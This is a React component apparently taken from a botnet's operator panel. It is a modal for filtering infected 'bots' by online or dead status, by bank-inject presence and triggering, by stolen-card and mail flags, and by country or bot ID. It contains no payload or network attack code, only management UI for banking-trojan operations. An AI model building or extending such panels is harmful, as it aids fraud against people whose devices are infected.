import React from 'react';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import { try_eval } from '../../serviceF';
import OnOffSwitcher from './OnOffSwitcher';
import InjectListNamer from './InjectListNamer';

class BotSortModal extends React.Component {
    constructor(props)
    {
        super(props);
        this.state = {
            botOnline: SettingsContext.BotsFilterMode[0],
            botOffline: SettingsContext.BotsFilterMode[1],
            botDead: SettingsContext.BotsFilterMode[2],
            botHaveExistBanks: SettingsContext.BotsFilterMode[3],
            botHaveNotExistBanks: SettingsContext.BotsFilterMode[4],
            botTriggerStatBanks: SettingsContext.BotsFilterMode[5],
            botTriggerStatCC: SettingsContext.BotsFilterMode[6],
            botTriggerStatMail: SettingsContext.BotsFilterMode[7],
            botFilterCountry: SettingsContext.BotsFilterMode[8],
            botFilterID: SettingsContext.BotsFilterMode[9],
            botByCountry: SettingsContext.BotByCountry,
            botsPerPage: SettingsContext.BotsPerPage,
            FindBotById: SettingsContext.FindBotByID
        };
    }
    /**
    1 - online
    2 - offline
    3 - dead
    4 - Exist App Banks
    5 - No Exist App Banks
    6 - statBank==1
    7 - statCC==1
    8 - statMail==1
     */

    onChangeConutry = (e) => {
        if(e.target.value.length < 4)
        this.setState({
            botByCountry: this.state.botFilterCountry == "1" ? e.target.value : ''
        });
    }

    onChangeBotID = (e) => {
        this.setState({
            FindBotById: this.state.botFilterID == "1" ? e.target.value : ''
        });
    }

    componentWillReceiveProps() {

    }

    ChangeSettings() {
        this.props.BotListForceUpdate();
        SettingsContext.SaveSettingsCookies();
    }

    HideThisModal() {
        try_eval('$("#BotSortTableModal").modal("hide");');
    }

    componentDidUpdate() {
        try_eval('UpdateToolTips();');
    }

    componentDidMount() {
        try_eval('UpdateToolTips();');
    }

    callbackBtn(Value, BtnParam) {
        if(BtnParam == "botOnline"){
            this.setState({
                botOnline: Value
            });
        }
        else if(BtnParam == "botOffline"){
            this.setState({
                botOffline: Value
            });
        }
        else if(BtnParam == "botDead"){
            this.setState({
                botDead: Value
            });
        }
        else if(BtnParam == "botHaveExistBanks"){
            this.setState({
                botHaveExistBanks: Value
            });
        }
        else if(BtnParam == "botHaveNotExistBanks"){
            this.setState({
                botHaveNotExistBanks: Value
            });
        }
        else if(BtnParam == "botTriggerStatBanks"){
            this.setState({
                botTriggerStatBanks: Value
            });
        }
        else if(BtnParam == "botTriggerStatCC"){
            this.setState({
                botTriggerStatCC: Value
            });
        }
        else if(BtnParam == "botTriggerStatMail"){
            this.setState({
                botTriggerStatMail: Value
            });
        }
        else if(BtnParam == "botFilterCountry") {
            this.setState({
                botFilterCountry: Value,
                botByCountry: Value == "1" ? this.state.botByCountry : ''
            });
        }
        else if(BtnParam == "botFilterID") {
            this.setState({
                botFilterID: Value,
                FindBotById: Value == "1" ? this.state.FindBotById : ''
            });
        }
    }

    SaveSettings() {
        if(this.state.botByCountry == '') {
            this.state.botFilterCountry = 0;
        }
        SettingsContext.BotsFilterMode =
            this.state.botOnline + 
            this.state.botOffline + 
            this.state.botDead + 
            this.state.botHaveExistBanks + 
            this.state.botHaveNotExistBanks + 
            this.state.botTriggerStatBanks + 
            this.state.botTriggerStatCC + 
            this.state.botTriggerStatMail + 
            this.state.botFilterCountry +
            this.state.botFilterID;
        SettingsContext.BotsPerPage = this.state.botsPerPage;
        SettingsContext.BotByCountry = this.state.botByCountry;
        SettingsContext.FindBotByID = this.state.FindBotById;
        this.ChangeSettings();
        this.HideThisModal();
    }

    checkOnlyNumbers(val) {
        return parseInt(val) ? true : false;
    }

    onChangeBotsPerPage = (e) => {
        if(this.checkOnlyNumbers(e.target.value)) {
            this.setState({ 
                botsPerPage: parseInt(e.target.value.substring(0,3))
            });
        }
        else if(e.target.value == '') {
            this.setState({ 
                botsPerPage: ''
            });
        }
    }


    OnFocusChange = (e) => {
        if(e.target.value == '') {
            this.setState({ 
                botsPerPage: SettingsContext.BotsPerPage,
                FindBotById: SettingsContext.FindBotByID
            });
        }
    }

    render() {
        return (
          //<!-- Modal -->
            <div class="modal fade" id="BotSortTableModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
                <div class="modal-dialog modal-dialog-centered" role="document">
                    <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLongTitle">{"Filter table"}</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                    <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Only Online Bots <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botOnline"} status={this.state.botOnline} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Only Offline Bots <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botOffline"} status={this.state.botOffline} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Only dead Bots <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botDead"} status={this.state.botDead} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Bots have exist injects <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botHaveExistBanks"} status={this.state.botHaveExistBanks} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Bots not have exist injects <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botHaveNotExistBanks"} status={this.state.botHaveNotExistBanks} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Inject triggered <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botTriggerStatBanks"} status={this.state.botTriggerStatBanks} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Filter bots by country {this.state.botFilterCountry == "1" ? <input style={({display:"inline",width:"30%",height:"21px",marginLeft:"10%"})} class="form-control" value={this.state.botByCountry} onChange={this.onChangeConutry} placeholder="country code" /> : <React.Fragment />} <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botFilterCountry"} status={this.state.botFilterCountry} />
                                </li>
                            </ol>
                        </nav>
                        
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Find bot by ID {this.state.botFilterID == "1" ? <input style={({display:"inline",width:"50%",height:"21px",marginLeft:"10%"})} class="form-control" value={this.state.FindBotById} onChange={this.onChangeBotID} placeholder="bot id" /> : <React.Fragment />} <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botFilterID"} status={this.state.botFilterID} />
                                </li>
                            </ol>
                        </nav>
                        <div class="input-group input-group-sm mb-3">
                            <div class="input-group-prepend">
                                <span class="input-group-text" id="inputGroup-sizing-sm">Bots per page</span>
                            </div>
                            <input type="text" value={this.state.botsPerPage} pattern="[0-9]*" onChange={this.onChangeBotsPerPage.bind(this)} class="form-control" aria-label="Bots per page" aria-describedby="inputGroup-sizing-sm" />
                        </div>
                        <div class="modal-footer">
                            <button type="button" onBlur={this.OnFocusChange.bind(this)} onClick={this.SaveSettings.bind(this)} class="btn btn-outline-warning">Apply filter</button>
                        </div>
                    </div>
                    </div>
                </div>
            </div>
      );
    }
}

export default BotSortModal;